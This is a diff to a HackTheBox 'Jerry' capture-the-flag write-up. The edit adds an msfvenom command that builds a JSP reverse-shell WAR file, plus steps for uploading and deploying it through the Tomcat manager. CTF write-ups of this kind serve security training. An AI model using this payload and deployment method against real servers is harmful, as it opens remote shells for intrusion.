@@ -18,11 +18,12 @@ Therefore, we use the given username and userpassword to login.<br>
 After login succcessfully, the url appended the postfix <code>/manager/html</code>.<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/manager.png" alt="manager" width="60%">
 Since now we are free to deploy <code>war files</code>, let’s generate a war file using <code>msfvenom</code> and save it as shell.war.<br>
-FYI：How to use <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">Msfvenom</a><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/WAR.png" alt="WAR" width="60%">
-
+FYI：How to use <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">Msfvenom</a><br>
+<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Local IP&gt; LPORT=&lt;Local PORT&gt; -f war > /shell.war</code>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/msfvenom.png" alt="msfvenom" width="60%">
-
+Once the shell.war is generated, upload it to Tomcat.<br>
+Click <code>Deploy</code> after seeing the previously generated war file is selected that shown as below. <br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/uploadshell.war.png" alt="uploadshell.war" width="60%">
 
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Retired/Jerry/Jerry/afterupload.png" alt="afterupload" width="60%">
